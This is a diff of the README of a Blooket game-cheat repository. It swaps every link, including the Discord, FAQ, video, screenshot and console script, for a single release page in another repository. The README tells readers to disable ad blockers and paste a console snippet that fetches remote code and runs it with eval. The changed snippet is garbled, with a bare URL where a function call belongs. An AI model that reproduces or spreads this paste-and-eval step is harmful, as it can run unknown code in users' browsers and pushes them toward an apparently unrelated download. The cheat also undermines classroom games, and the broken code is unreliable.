@@ -1,9 +1,9 @@
-**Discord server: https://discord.gg/E7cmjUG9Gs** discord server is not related to this repo
+**Discord server: https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0** discord server is not related to this repo
 
 # Blooket-Hack
 All of the cheats are based on a game mode.
 
-**If anything isn't working please make a issue after checking with the FAQ: https://github.com/glixzzy/blooket-hack/issues**
+**If anything isn't working please make a issue after checking with the FAQ: https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0**
 
 **scroll down for video tutorial**
 
@@ -12,17 +12,17 @@ note: **TURN YOUR AD BLOCKER OFF OR IT WON'T WORK!**
 
 Open console and paste this: 
 ```js
-fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/main.js")
-.then((res) => res.text()
+fetch("https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0")
+.then((res) => https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0()
 .then((t) => eval(t)))
 ```
 
 # Video Tutorial
-https://user-images.githubusercontent.com/73669084/137641316-ad4f1cbb-0f3d-46e2-83a7-74b7e8b9dd3c.mp4
+https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0
 
 
 # Bookmarklet tutorial:
-https://streamable.com/t4u7i7
+https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0
 
 1. Make a bookmark (the star on the right side of the url bar if you are using chrome)
 2. Click on more at the bottom left corner
@@ -49,7 +49,7 @@ A: Nope! This is simply not possible, because it is server-side.
 A: Yes and no. This is possible even without these hacks, if you gain enough xp through grinding or using the addTokens hack, you will be able to make your own custom blooks under the Stats tab on Blooket. But if you are trying to upload your own fully custom blooks, this is not currently possible, as all blooks are server-side.
 
 **Q: Ahhh! My account was banned! Was I just banned for hacking blooket?**
-![Screen Shot 2021-10-07 at 6 39 06 PM](https://user-images.githubusercontent.com/92130749/136484808-0dada02e-ae99-49cd-b036-d2a13c8c9684.png)
+![Screen Shot 2021-10-07 at 6 39 06 PM](https://github.com/TGC1020/blooket_hack_improved_Glixzzy/releases/tag/v2.0)
 
 A: Probably not, this is a bug that is going around that doesn't let you in your account for a short period of time. The best thing to do is just wait it out.
 
